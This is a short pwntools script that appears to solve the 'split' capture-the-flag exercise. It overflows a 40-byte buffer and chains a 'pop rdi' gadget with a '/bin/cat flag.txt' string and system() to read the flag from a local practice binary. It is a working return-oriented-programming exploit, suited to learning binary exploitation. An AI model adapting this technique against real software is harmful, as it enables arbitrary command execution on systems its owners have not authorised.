from pwn import *

p = process("./split")
system = 0x40074b
POP_RDI = 0x4007c3
bin_cat_str = 0x601060

# payload = flat(
#    'A' * 40,
#     0x4007c3,         # pop rdi; ret
     # next(libc.search(b'/bin/cat')),
#     p64("/bin/cat flag.txt"),
#     libc.sym['system']
#)

payload = b'A' * 40
payload += p64(POP_RDI)
payload += p64(bin_cat_str)
payload += p64(system)
payload += p64(0x0)

p.sendline(payload)
p.interactive()
